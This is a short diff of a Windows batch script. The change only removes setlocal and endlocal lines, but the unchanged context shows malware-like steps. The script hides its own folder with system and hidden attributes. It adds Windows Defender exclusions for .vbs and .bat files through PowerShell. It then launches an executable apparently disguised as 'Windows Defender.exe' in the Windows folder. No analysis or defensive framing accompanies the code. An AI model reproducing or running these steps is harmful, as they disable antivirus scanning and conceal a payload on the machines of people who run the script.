@@ -1,5 +1,4 @@
 @echo off
-setlocal
 attrib +s +h +i "%~dp0"
 
 :connectivitycheck
@@ -66,6 +65,3 @@ powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
 "C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
-endlocal
-
-
